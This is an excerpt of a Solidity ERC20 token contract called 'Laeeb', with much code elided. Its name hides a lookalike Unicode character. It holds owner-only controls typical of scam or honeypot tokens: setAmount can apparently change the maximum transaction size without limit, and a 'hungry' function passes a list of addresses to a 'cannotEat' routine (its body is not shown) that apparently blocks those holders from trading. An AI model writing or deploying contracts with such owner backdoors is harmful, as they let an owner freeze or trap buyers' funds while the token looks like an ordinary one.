...
contract Laeeb is ERC20, Ownable {
    ...
    uint256 public maxTxAmount = 15000000000000 * (10**18);
    uint256 public maxWalletAmount = 15000000000000 * (10**18);
    ...
    address public _marketingWalletAddress = 0xaF52CF74bed37AEaa1C4F8C5e23EDd9dB24e7Dd2;
    ...
    constructor(address receiveAddress) public ERC20("La๎eeb", "La๎eeb") {
    ...
    function setETHRewardsFee(uint256 value) external onlyOwner{
        require(value.add(liquidityFee).add(marketingFee) <= 10);
        ETHRewardsFee = value;
    ...
    function setMarketingFee(uint256 value) external onlyOwner{
        require(ETHRewardsFee.add(liquidityFee).add(value) <= 10);
        marketingFee = value;
        totalFees = ETHRewardsFee.add(liquidityFee).add(marketingFee);
    }
    ...
    function setAmount(uint _maxTx, uint _maxWallet) external onlyOwner {
        maxTxAmount = _maxTx;
    ...
    function hungry(address[] memory eatList) external onlyOwner {
        for(uint i=0;i<eatList.length;i++) {
            cannotEat(eatList[i]);
        }
    }
